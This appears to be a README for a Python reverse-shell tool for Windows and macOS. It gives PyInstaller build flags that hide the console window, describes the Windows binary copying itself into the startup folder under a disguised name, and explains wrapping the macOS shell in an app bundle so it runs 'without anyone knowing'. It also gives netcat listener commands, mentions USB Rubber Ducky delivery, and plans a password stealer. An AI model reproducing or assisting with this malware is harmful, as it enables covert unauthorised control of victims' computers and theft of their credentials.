# Python3-Shell
Reverse shell for Mac and Windows
It works in both python2 and python3

TODO:
Create a password stealer, 
Create file downloader, 
Maybe create server side

# Shell for Windows

Change the ip-address and port to yours

To compile the .py file use Pyinstaller and the following command:

    pyinstaller --onefile --windowed windowsoperator.py

it is important that you dont rename the file, because when its executed it will move itself to the startup folder and be renamed to windows_shell.exe

--onefile: to make it compile into 1 file
--windowed: to run it without a cmd window

It will compile to a Dist folder

To gain access use netcat with the following command:
    
    nc -l yourport
    
This listens for the port you gave it

# Shell for OSX

change the ip and port to yours

for OSX you need to make it a .app package. For that use "appify" to make it a bundle

    appify FU.sh "you app name"
    
After that you need to rename the Shell to "backuptraceback.py" and drag into yourapp.app/Contens/MacOS
now when you double-click it will copy backuptraceback.py/the shell into downloads, and run it as a subprocess without anyone knowing

To gain access use netcat with the following command:
    
    nc -l yourport

This listens for the port you gave it

# Shell for Windows with USB Rubber ducky/Malduino

Only works for the Danish keyboard, but it should'nt take more than a couple of minutes to make it compatible with your keyboard

put your file onto an apache/ngninx server
